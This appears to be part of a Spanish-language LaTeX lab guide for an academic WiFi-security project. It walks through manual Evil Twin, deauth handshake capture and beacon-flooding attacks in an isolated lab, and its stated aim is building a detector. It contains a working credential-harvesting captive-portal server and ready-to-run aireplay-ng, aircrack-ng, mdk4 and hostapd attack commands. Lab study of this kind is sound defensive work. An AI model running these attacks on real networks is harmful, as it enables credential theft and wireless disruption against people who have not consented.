+class PortalHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        with open('index.html', 'rb') as f:
+            contenido = f.read()
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html; charset=utf-8')
+        self.end_headers()
+        self.wfile.write(contenido)
+
+    def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        body = self.rfile.read(length).decode('utf-8')
+        datos = parse_qs(body)
+        timestamp = datetime.datetime.now().isoformat()
+        print(f``[{timestamp}] CREDENCIALES CAPTURADAS:'')
+        print(f``  Usuario: {datos.get('usuario', [''])[0]}'')
+        print(f``  Password: {datos.get('password', [''])[0]}'')
+        print(f``  Cliente IP: {self.client_address[0]}'')
+        print(``---'')
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b``<h1>Sesion iniciada (demo)</h1>'')
+
+if __name__ == '__main__':
+    print(``Portal cautivo de demostracion WARDEN escuchando en 10.0.0.1:80'')
+    HTTPServer(('10.0.0.1', 80), PortalHandler).serve_forever()
+\end{lstlisting}
+
+\subsection{Lanzar el Evil Twin}
+Necesitarás varias terminales, una por cada componente.
+
+\textbf{Terminal 1 - hostapd (el AP):}
+
+\begin{lstlisting}
+sudo hostapd /tmp/eviltwin-hostapd.conf
+\end{lstlisting}
+
+Verás logs indicando que el AP está activo. Si hay errores, suele ser
+por NetworkManager controlando la interfaz. En ese caso, primero:
+
+\begin{lstlisting}
+sudo nmcli device set wlp98s0 managed no
+\end{lstlisting}
+
+Y vuelve a lanzar \texttt{hostapd}.
+
+\textbf{Terminal 2 - dnsmasq (DHCP+DNS):}
+
+\begin{lstlisting}
+sudo dnsmasq -C /tmp/eviltwin-dnsmasq.conf -d
+\end{lstlisting}
+
+\textbf{Flags:}
+
+\begin{itemize}
+  \item \texttt{-C} - usar el archivo de configuración indicado.
+  \item \texttt{-d} - modo ``no daemon'', se queda en primer plano para
+    que veas los logs.
+\end{itemize}
+
+\textbf{Terminal 3 - servidor del portal cautivo:}
+
+\begin{lstlisting}
+cd ~/eviltwin-portal
+sudo python3 servidor.py
+\end{lstlisting}
+
+Necesita \texttt{sudo} porque el puerto 80 está privilegiado.
+
+\textbf{Terminal 4 (opcional) - captura con Wireshark o tcpdump en
+\texttt{panda0} en modo monitor}, para registrar cómo se ve el Evil Twin
+desde el aire.
+
+\subsection{Probar el ataque}
+
+\begin{enumerate}
+  \item En el celular Redmi Note 7, ve a la lista de redes WiFi.
+  \item Verás \texttt{LAB\_WARDEN\_UTP} (sin candado, abierta).
+  \item Conéctate a esa red.
+  \item Android detectará automáticamente que es una red con portal
+    cautivo y lo abrirá. Si no lo abre solo, abre el navegador y entra
+    a cualquier dirección (\texttt{example.com}, \texttt{google.com}).
+  \item Verás el portal cautivo de WARDEN, con el aviso rojo de
+    demostración.
+  \item Ingresa credenciales \textbf{ficticias} - usa las estándar
+    definidas en el Threat Model:
+    \begin{itemize}
+      \item Usuario: \texttt{demo.user@warden.test}
+      \item Contraseña: \texttt{demo-password-12345}
+    \end{itemize}
+  \item Pulsa ``Iniciar sesion''.
+  \item En la Terminal 3 (la del servidor Python), verás aparecer las
+    credenciales capturadas con su timestamp.
+\end{enumerate}
+
+\subsection{Detener el ataque}
+\texttt{Ctrl+C} en cada una de las tres terminales (servidor, dnsmasq,
+hostapd) en ese orden. Restaura la interfaz si fue necesario:
+
+\begin{lstlisting}
+sudo nmcli device set wlp98s0 managed yes
+sudo ip addr del 10.0.0.1/24 dev wlp98s0
+\end{lstlisting}
+
+\subsection{Lo que aprendimos}
+Acabamos de ejecutar manualmente lo que la ESP32 hará en la fase 3 de la
+cadena. Los componentes son:
+
+\begin{itemize}
+  \item Un AP falso clonando el SSID legítimo, sin protección.
+  \item Asignación de IPs vía DHCP.
+  \item Redirección DNS de todo a una IP local.
+  \item Servidor web sirviendo un portal cautivo falso.
+  \item Captura y registro de las credenciales ingresadas.
+\end{itemize}
+
+\textbf{La firma de detección del Evil Twin}: aparición de un nuevo BSSID
+anunciando un SSID que ya estaba en uso por otro BSSID conocido,
+generalmente con configuración de seguridad distinta (la red legítima
+estaba en WPA2, el Evil Twin es abierto).
+
+% ==============================================================================
+\section{Resumen de lo validado}
+% ==============================================================================
+
+\begin{datatable}{L{10cm} L{2cm}}{Aspecto & Estado}
+\drow{Interfaz renombrada a \texttt{panda0} (persistente vía udev)        & OK}
+\drow{Adaptador detectado a nivel USB (\texttt{0e8d:7610})               & OK}
+\drow{Driver \texttt{mt76x0u} cargado por el kernel                       & OK}
+\drow{Modo \texttt{monitor} soportado por el chipset                       & OK}
+\drow{Banda 2.4 GHz (canales 1 a 13) disponible                            & OK}
+\drow{Activación de modo monitor exitosa                                   & OK}
+\drow{Captura en vivo de frames 802.11 con \texttt{tcpdump}                & OK}
+\drow{Captura y análisis con Wireshark                                     & OK}
+\drow{Ataque manual 1: handshake WPA2 con deauth                           & OK}
+\drow{Ataque manual 2: Beacon Flooding con \texttt{mdk4}                   & OK}
+\drow{Ataque manual 3: Evil Twin con portal cautivo                        & OK}
+\end{datatable}
+
+\textbf{Conclusión:} el adaptador Panda Wireless PAU0B AC600 cumple
+todos los requisitos técnicos del proyecto. Los tres ataques manuales
+documentados son la base que la ESP32 va a automatizar en su firmware, y
+que el detector del proyecto va a identificar.
+
+% ==============================================================================
+\section{Comandos de referencia rápida}
+% ==============================================================================
+
+\begin{lstlisting}
+# --- Setup del Panda ---
+ethtool -P panda0                       # MAC permanente
+lsusb                                   # ver USB
+sudo dmesg | grep -i mt76               # ver carga del driver
+iw dev                                  # listar interfaces wireless
+iw phy phy1 info                        # capacidades del chipset
+
+# --- Activar modo monitor ---
+sudo ip link set panda0 down
+sudo iw dev panda0 set type monitor
+sudo ip link set panda0 up
+sudo iw dev panda0 set channel 6
+
+# --- Desactivar modo monitor ---
+sudo ip link set panda0 down
+sudo iw dev panda0 set type managed
+sudo ip link set panda0 up
+
+# --- Captura ---
+sudo tcpdump -i panda0 -c 20 -e         # validacion rapida
+wireshark                               # captura grafica
+
+# --- Ataque 1: handshake con deauth ---
+sudo airodump-ng panda0                                          # escaneo
+sudo airodump-ng --bssid <BSSID> -c <CH> -w handshake panda0     # captura enfocada
+sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENTE> panda0       # deauth
+aircrack-ng handshake-01.cap                                     # verificar
+
+# --- Ataque 2: Beacon Flooding ---
+sudo mdk4 panda0 b -n ``FakeNet'' -c 6                             # flood con prefijo
+sudo mdk4 panda0 b -c 6                                          # flood aleatorio
+
+# --- Ataque 3: Evil Twin ---
+sudo hostapd /tmp/eviltwin-hostapd.conf                          # AP falso
+sudo dnsmasq -C /tmp/eviltwin-dnsmasq.conf -d                    # DHCP+DNS
+sudo python3 servidor.py                                         # portal
+
+# --- Restaurar NetworkManager si se apago ---
+sudo systemctl start NetworkManager
+nmcli device status
+\end{lstlisting}
+
+% ==============================================================================
+\section{Próximos pasos}
+% ==============================================================================
+
+Con esta base validada, lo que sigue en el proyecto es:
+
+\begin{enumerate}
+  \item \textbf{Setup del router de laboratorio aislado}, con SSID
+    \texttt{LAB\_WARDEN\_UTP} y desconectado de internet.
+  \item \textbf{Implementación del firmware de la ESP32} que automatice
+    los tres ataques que aquí ejecutamos manualmente.
+  \item \textbf{Implementación del detector en Python con Scapy}, que
+    identifique las firmas de cada uno de los tres ataques.
+  \item \textbf{Pruebas end-to-end integradas:} ESP32 atacando
+    $\rightarrow$ Panda capturando $\rightarrow$ detector alertando.
+  \item \textbf{Demostración final} del sistema completo.
+\end{enumerate}
+
+\end{document}
